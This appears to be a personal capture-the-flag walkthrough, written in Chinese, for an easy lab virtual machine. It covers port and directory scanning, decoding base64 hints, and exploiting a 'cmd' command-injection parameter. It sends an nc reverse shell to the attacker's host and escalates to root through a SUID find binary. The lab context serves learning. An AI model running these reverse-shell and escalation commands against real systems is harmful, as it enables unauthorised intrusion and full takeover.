> 需要手动修改网卡 /etc/init.d/networking restart，通过命令执行来执行反弹shell后，find suid文件来提权
## 靶机信息
级别:容易

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.153

sudo nmap --min-rate 10000 -sT -p- 192.168.1.153 -oA tcp_ports/ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Web

![[Pasted image 20231013164958.png]]
### 目录爆破
```shell
gobuster dir -u http://192.168.1.153 -w /usr/share/wordlists/dirb/common.txt
/robots.txt           (Status: 200) [Size: 53]
bG9sIHRyeSBoYXJkZXIgYnJvCg==
echo 'bG9sIHRyeSBoYXJkZXIgYnJvCg==' | base64 -d
//lol try harder bro
```

![[Pasted image 20231013165346.png]]
查看源码，最低端发现加密信息
```shell
WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK
将其多次base64 decode之后得信息 //workinginprogress.php
```
![[Pasted image 20231013165816.png]]
提示可能存在命令执行，尝试ping并不行(command,cmd,ping),cmd是可以的
```shell
http://192.168.1.153/workinginprogress.php?cmd=whoami
```
![[Pasted image 20231013165927.png]]

## 提权
```shell
http://192.168.1.153/workinginprogress.php?cmd=nc%20192.168.1.136%201234%20-e%20/bin/bash
本地开启 nc -lvnp 1234
成功得到立足点
```

### 通过find提权
```shell
find / -type f -perm -u=s 2>/dev/null
/usr/bin/find

/usr/bin/find . -exec /bin/sh -p \; -quit //参考GTFOBins
1. `/usr/bin/find`：这是 `find` 命令的完整路径。`find` 是一个用于在指定目录及其子目录中查找文件和目录的工具。在这里，它的作用是搜索文件和目录。
    
2. `.`：这个点表示查找的起始目录，通常是当前目录。`find` 将从当前目录开始搜索。
    
3. `-exec`：这个选项告诉 `find` 在找到的每一个匹配项上执行后续的命令。
    
4. `/bin/sh`：这是一个命令解释器的路径。在这种情况下，它使用 `/bin/sh`，这是一个常见的Unix/Linux shell。 `-p` 选项通常用于执行一个新的 shell 进程。
    
5. `\;`：这是 `-exec` 选项的一部分，表示 `-exec` 命令的结尾。


```
![[Pasted image 20231013170735.png]]
成功提权
